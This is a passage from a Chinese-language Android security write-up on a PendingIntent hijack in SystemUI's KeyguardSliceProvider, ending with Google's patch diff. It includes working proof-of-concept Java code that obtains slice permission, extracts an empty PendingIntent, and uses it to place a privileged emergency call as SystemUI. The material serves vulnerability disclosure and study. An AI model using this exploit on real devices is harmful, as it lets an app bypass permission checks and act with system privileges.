\----POC1----
     final static String uriKeyguardSlices = "content://com.android.systemui.keyguard";
     Bundle responseBundle = getContentResolver().call(Uri.parse(uriKeyguardSlices), "bind_slice", null, prepareReqBundle());
     Slice slice = responseBundle.getParcelable("slice");
     Log.d("pi", slice.toString());
    private Bundle prepareReqBundle() {
            Bundle b = new Bundle();
            b.putParcelable("slice_uri", Uri.parse(uriKeyguardSlices));
            ArrayList supportedSpecs = new ArrayList();
            supportedSpecs.add(new SliceSpec("androidx.app.slice.LIST", 1));
            supportedSpecs.add(new SliceSpec("androidx.slice.LIST", 1));
            supportedSpecs.add(new SliceSpec("androidx.app.slice.BASIC", 1));
            b.putParcelableArrayList("supported_specs", supportedSpecs);
    return b;
     }
得到Slice如下
    05-30 08:31:02.306 11449 11449 D pi      : slice:
    05-30 08:31:02.306 11449 11449 D pi      :    image
    05-30 08:31:02.306 11449 11449 D pi      :    text: testAOSPSytemUIKeyguardSliceProvider wants to show System UI slices
    05-30 08:31:02.306 11449 11449 D pi      :    int
    05-30 08:31:02.306 11449 11449 D pi      :    slice:
    05-30 08:31:02.306 11449 11449 D pi      :       image
    05-30 08:31:02.306 11449 11449 D pi      :       action
从上面的text描述可知，由于SystemUI并没有授权给我们的app去访问这个Slice，我们的call触发了对Slice的授权请求，得到的Slice对象经由createPermissionSlice返回
`frameworks/base/core/java/android/app/slice/SliceProvider.java`
    private Slice handleBindSlice(Uri sliceUri, List supportedSpecs,
                String callingPkg, int callingUid, int callingPid) {
    // This can be removed once Slice#bindSlice is removed and everyone is using
    // SliceManager#bindSlice.
            String pkg = callingPkg != null ? callingPkg
                    : getContext().getPackageManager().getNameForUid(callingUid);
    try {
                mSliceManager.enforceSlicePermission(sliceUri, pkg,
                        callingPid, callingUid, mAutoGrantPermissions);
            } catch (SecurityException e) {
    return createPermissionSlice(getContext(), sliceUri, pkg);
            }
这个Slice封装了一个向用户获取授权的动作，通过createPermissionSlice函数得到
`frameworks/base/core/java/android/app/slice/SliceProvider.java`
    public Slice createPermissionSlice(Context context, Uri sliceUri,
    String callingPackage) {
    PendingIntent action;
    mCallback = "onCreatePermissionRequest";
    Handler.getMain().postDelayed(mAnr, SLICE_BIND_ANR);
    try {
    action = onCreatePermissionRequest(sliceUri);
    } finally {
    Handler.getMain().removeCallbacks(mAnr);
    }
最终调用createPermissionIntent，构造一个PendingIntent，用于弹出授权对话框SlicePermissionActivity
`frameworks/base/core/java/android/app/slice/SliceProvider.java`
    /**
         * @hide
         */
    public static PendingIntent createPermissionIntent(Context context, Uri sliceUri,
                String callingPackage) {
            Intent intent = new Intent(SliceManager.ACTION_REQUEST_SLICE_PERMISSION);
            intent.setComponent(new ComponentName("com.android.systemui",
    "com.android.systemui.SlicePermissionActivity"));
            intent.putExtra(EXTRA_BIND_URI, sliceUri);
            intent.putExtra(EXTRA_PKG, callingPackage);
            intent.putExtra(EXTRA_PROVIDER_PKG, context.getPackageName());
    // Unique pending intent.
            intent.setData(sliceUri.buildUpon().appendQueryParameter("package", callingPackage)
                    .build());
    return PendingIntent.getActivity(context, 0, intent, 0);
        }
看到这里，就知道普通App也可以直接发起这个授权，让用户同意对KeyguardSliceProvider的访问，POC发起授权的部分如下。
\---POC2---
    Intent intent = new Intent("com.android.intent.action.REQUEST_SLICE_PERMISSION");
                    intent.setComponent(new ComponentName("com.android.systemui",
    "com.android.systemui.SlicePermissionActivity"));
                    Uri uri = Uri.parse(uriKeyguardSlices);
                    intent.putExtra("slice_uri", uri);
                    intent.putExtra("pkg", getPackageName());
                    intent.putExtra("provider_pkg", "com.android.systemui");
                    startActivity(intent);
点击同意后，就可以真正call到KeyguardSliceProvider
### 0x06 PendingIntent劫持题
再次调用POC1，得到Slice如下，
    sargo:/data/system/slice # logcat -s pi
    --------- beginning of main
    05-30 10:40:52.956 12871 12871 D pi      : long
    05-30 10:40:52.956 12871 12871 D pi      : slice:
    05-30 10:40:52.956 12871 12871 D pi      :    text: Sat, May 30
    05-30 10:40:52.956 12871 12871 D pi      : slice:
    05-30 10:40:52.956 12871 12871 D pi      :    action
    05-30 10:40:52.956 12871 12871 D pi      : long
注意上面显示的
那个action就是需要劫持的PendingIntent，通过调试观察，这个PendingIntent被层层包裹，位于返回Slice第3个SliceItem的第1个SliceItem，用代码表示就是
`PendingIntent pi =
slice.getItems().get(2).getSlice().getItems().get(0).getAction();`
这样就可以给出POC的最终利用
\---POC3---
    Bundle responseBundle = getContentResolver().call(Uri.parse(uriKeyguardSlices), "bind_slice", null, prepareReqBundle());
    Slice slice = responseBundle.getParcelable("slice");
    Log.d("pi", slice.toString());
    PendingIntent pi = slice.getItems().get(2).getSlice().getItems().get(0).getAction();
    Intent evilIntent = new Intent("android.intent.action.CALL_PRIVILEGED");
    evilIntent.setData(Uri.parse("tel:911"));
    try {
        pi.send(getApplicationContext(), 0, evilIntent, null, null);
    } catch (PendingIntent.CanceledException e) {
       e.printStackTrace();
    }
在用户仅授权访问SystemUI KeyguardSliceProvider的情况下，拨打紧急电话。
至此，我们通过call函数，经过SliceProvider的授权，层层剥茧抽丝，拿到了潜藏至深的双无PendingIntent，并以SystemUI的名义直接拨打紧急电话。这是一个绕过有关安全设置权限的操作，因此Google评级为高危。
### 0x07 修复
Google针对双无PendingIntent进行了修复，使其指向一个并不存在的的Activity，无法被劫持。
    -            mPendingIntent = PendingIntent.getActivity(getContext(), 0, new Intent(), 0);
    +            mPendingIntent = PendingIntent.getActivity(getContext(), 0,
    +                    new Intent(getContext(), KeyguardSliceProvider.class), 0);
### 0x08 参考
[1] 
[2] 
[3]
[4] 
[5] 
[6] 
* * *